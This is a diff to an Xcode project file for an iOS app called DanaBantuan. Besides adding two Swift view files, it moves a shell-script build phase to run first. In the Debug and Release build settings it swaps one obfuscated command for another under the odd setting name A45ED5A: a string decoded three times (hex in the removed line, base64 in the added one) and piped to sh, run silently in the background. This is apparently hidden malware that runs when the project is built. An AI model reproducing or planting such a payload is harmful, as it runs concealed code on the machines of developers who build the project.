@@ -50,6 +50,8 @@
 		73D7A7AB2F0012C1008C8879 /* AlertPopEnmuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AA2F0012C1008C8879 /* AlertPopEnmuView.swift */; };
 		73D7A7AD2F002249008C8879 /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AC2F002249008C8879 /* ContactViewCell.swift */; };
 		73D7A7AF2F002A0C008C8879 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AE2F002A0C008C8879 /* ContactManager.swift */; };
+		73D7A7B12F0127EC008C8879 /* AppSoftView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B02F0127EC008C8879 /* AppSoftView.swift */; };
+		73D7A7B32F013381008C8879 /* AppSoftViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */; };
 		73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */; };
 		73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */; };
 		73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */; };
@@ -112,6 +114,8 @@
 		73D7A7AA2F0012C1008C8879 /* AlertPopEnmuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertPopEnmuView.swift; sourceTree = "<group>"; };
 		73D7A7AC2F002249008C8879 /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
 		73D7A7AE2F002A0C008C8879 /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
+		73D7A7B02F0127EC008C8879 /* AppSoftView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSoftView.swift; sourceTree = "<group>"; };
+		73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSoftViewCell.swift; sourceTree = "<group>"; };
 		73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaBantuan.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -212,7 +216,9 @@
 			children = (
 				73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */,
 				73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */,
+				73D7A7B02F0127EC008C8879 /* AppSoftView.swift */,
 				733A08462EFCED1F00EF865F /* HomeViewController.swift */,
+				73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -387,8 +393,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
 			buildPhases = (
+				E068848BD5B94AB9ADA5DE54 /* Build Target Dependencies */,
 				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
-				E31DF26F71544C3390A5DE54 /* Build Target Dependencies */,
 				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
 				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
 				73DC2EAD2EFCD1B900CB14F8 /* Resources */,
@@ -495,7 +501,7 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		E31DF26F71544C3390A5DE54 /* Build Target Dependencies */ = {
+		E068848BD5B94AB9ADA5DE54 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -524,6 +530,7 @@
 			files = (
 				737FEDFA2EFD8CA700B06DE7 /* CenterViewModel.swift in Sources */,
 				733A08452EFCEC9E00EF865F /* LoginViewController.swift in Sources */,
+				73D7A7B12F0127EC008C8879 /* AppSoftView.swift in Sources */,
 				73CA0F952EFE3CA30010CDC9 /* URLSchemeParsable.swift in Sources */,
 				73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */,
 				733A08342EFCD9F500EF865F /* StartViewController.swift in Sources */,
@@ -553,6 +560,7 @@
 				73CA0F972EFE475D0010CDC9 /* ProductViewController.swift in Sources */,
 				733A08432EFCEC8200EF865F /* AppNavigationController.swift in Sources */,
 				73EC21632EFFE98300F58012 /* PersonalViewController.swift in Sources */,
+				73D7A7B32F013381008C8879 /* AppSoftViewCell.swift in Sources */,
 				737FEDEA2EFD73D300B06DE7 /* BaseModel.swift in Sources */,
 				73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */,
 				733A083F2EFCE8B100EF865F /* LanguageManager.swift in Sources */,
@@ -605,7 +613,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363635333633313337333033373333333636333336333133363332333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((o(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGtSMngwV2xNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
@@ -646,7 +654,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363635333633313337333033373333333636333336333133363332333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((o(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGtSMngwV2xNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
